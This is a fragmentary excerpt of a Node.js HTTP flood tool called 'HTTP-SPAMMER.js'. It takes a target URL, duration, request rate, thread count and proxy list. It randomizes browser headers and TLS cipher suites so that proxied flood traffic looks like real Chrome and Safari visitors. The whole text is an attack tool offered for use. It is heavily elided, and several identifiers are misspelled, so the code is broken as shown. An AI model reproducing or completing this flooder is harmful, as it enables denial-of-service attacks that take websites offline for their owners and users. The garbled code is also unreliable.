const net = require("net");
 ...
 if (process.argv.length < 7){console.log(`Usage: node HTTP-SPAMMER.js target time rate thread proxyfile`); process.exit();}
 const headers = {};
...
let headerGenerator = new HeaderGenerator({
    browsers: [
        ...
        {name: "chrome", minVersion: 80, httpVersion: "2"},
        {name: "safari", minVersion: 15, httpVersion: "2"},
    ],
    devices: [
        "desktop",
        "mobile",
...
let randomHeaders = headerGenerator.getHeaders();
 ...
 const cplist = [
     "AEAD-CHACHA20-POLY1305-SHA256:AES-GCM:!MD5:3DES",
 ...
 var options1 = method[Math.floor(Math.floor(Math.random() * method.length))];
 ...
 function runFlooder() {
     ...
     Socker.HTTP(proxyOptions, (connection, error) => {
         ...
         const tlsOptions = {
            ...
            challengeToSolve: 10,
            maxRedirects: 5,
            echdCurve: "X25519:secp256r1:secp521r1",
            ciphers: cipper,
            sigals: siga,
